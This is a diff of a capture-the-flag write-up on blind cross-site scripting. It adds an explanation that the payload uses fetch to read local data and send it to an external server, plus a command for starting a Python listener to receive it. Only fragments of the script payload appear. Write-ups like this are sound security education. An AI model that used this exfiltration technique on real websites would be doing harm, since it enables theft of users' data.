@@ -36,6 +36,8 @@ Feedback page:
 
 ### Blind XSS
 
+The exploitation consisted of fetching sensitive data from the local host via `fetch` and sending it to an external server via another `fetch` request.
+
 Payload:
 
     '"><script>
@@ -46,9 +48,13 @@ Payload:
         });
     </script>
 
-Open local server and use XSS payload
+Open local python server and use XSS payload!
+
+`python3 -m http.server <PORT>`
 
 ![image](https://github.com/user-attachments/assets/162820d2-6add-49e6-b546-2f9738ebb0e3)
+
+Now, we can get the flag!
 
 ![image](https://github.com/user-attachments/assets/69d38d01-7b08-421b-98ea-d2f4f7434f67)
 
